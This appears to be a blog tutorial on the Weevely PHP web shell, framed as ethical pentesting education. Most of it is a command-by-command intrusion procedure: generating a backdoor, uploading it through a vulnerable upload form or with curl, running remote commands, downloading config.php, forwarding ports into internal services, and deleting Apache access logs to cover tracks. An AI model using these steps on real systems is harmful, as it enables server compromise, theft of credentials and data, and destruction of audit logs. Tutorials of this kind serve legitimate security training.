# WeevelyTutorial

---

# Mastering Weevely: A Stealthy Guide to Web Shell Exploitation

Welcome, fellow hackers and security enthusiasts! Today, we're diving deep into the shadows of web exploitation with Weevely, the stealth PHP web shell that’s like the Swiss Army knife for web-based post-exploitation. Whether you’re a seasoned pentester or just starting, this guide will arm you with the knowledge to wield Weevely effectively and ethically. 

**Disclaimer:** This article is for educational purposes only. Always obtain explicit permission before testing any systems. Unauthorized access is illegal and unethical.

## What is Weevely?

Weevely is a versatile and stealthy PHP web shell that lets you control compromised web servers. Its compact and flexible nature makes it a favorite tool for penetration testers and black hat hackers alike. By embedding a backdoor in a PHP file, you can perform a variety of tasks remotely. Think of it as your secret agent on the inside.

## Getting Started with Weevely

### **1. Setting Up Weevely**

Good news—Weevely comes pre-installed on Kali Linux! No need to clone repositories or manually install it. Just fire up your Kali VM and get ready to work.

### **2. Crafting the Perfect Backdoor**

To create a backdoor, run the following command in your terminal:

```bash
weevely generate <password> /path/to/output/weevely.php
```

Replace `<password>` with a strong, unique password and `/path/to/output/weevely.php` with your desired file path. This command creates a PHP file that will serve as your gateway into the target server.

### **3. Uploading the Backdoor**

#### **Real-World Scenario: Exploiting File Upload Vulnerabilities**

Imagine you've found a vulnerable file upload feature on a target site. This could be an admin panel or a public file upload form that doesn’t sanitize file names. Here’s how you’d upload the Weevely backdoor:

1. **Manual Upload:**

   Navigate to the upload form on the target site and upload `weevely.php`. If you’re lucky, it’ll be directly accessible from the web.

2. **Automated Upload:**

   Use command injection or other vulnerabilities to upload the file. For example:

   ```bash
   curl -F "file=@weevely.php" http://target.com/upload.php
   ```

### **4. Connecting to Your Backdoor**

Once the backdoor is live on the server, connect to it using Weevely:

```bash
weevely <password> http://target.com/path/to/weevely.php
```

Replace `<password>` and the URL with the appropriate values. This command opens an interactive shell to your compromised server.

### **5. Unleashing Weevely's Power**

Now that you’re connected, let’s explore what you can do:

#### **Real-World Scenario: Post-Exploitation and Data Harvesting**

1. **Command Execution:**

   Run commands on the target server to gather information or manipulate files:

   ```bash
   exec whoami  # Find out which user you’re running as
   exec ls -la  # List files in the current directory
   ```

2. **File Management:**

   Download sensitive files or upload new ones:

   ```bash
   download /var/www/html/config.php /tmp/config.php
   upload /tmp/new_script.php /var/www/html/new_script.php
   ```

3. **Port Forwarding:**

   Access internal services that are otherwise hidden:

   ```bash
   portfwd 8080 127.0.0.1 80  # Forward port 8080 on your local machine to port 80 on the target server
   ```

4. **Browser Interface:**

   Use the built-in browser to interact with web-based applications:

   ```bash
   browser
   ```

### **6. Cleaning Up and Covering Tracks**

To avoid detection:

1. **Remove Backdoors:**

   Delete your backdoor file from the server:

   ```bash
   delete /path/to/weevely.php
   ```

2. **Clear Logs:**

   If your engagement allows, clear logs that might show your activities:

   ```bash
   exec rm -rf /var/log/apache2/access.log
   ```

### **7. Ethical Considerations**

Remember, with great power comes great responsibility. Always:

- **Obtain Permission:** Ensure you have explicit authorization before testing systems.
- **Follow the Law:** Stay within legal boundaries and ethical guidelines.
- **Minimize Impact:** Avoid causing unnecessary disruption to systems.

## Conclusion

Weevely is a potent tool for web shell exploitation, offering a range of capabilities from simple command execution to sophisticated data harvesting. By understanding and responsibly using tools like Weevely, you can enhance your penetration testing skills and better secure web applications against real-world threats.

Happy hacking—ethically, of course!

---
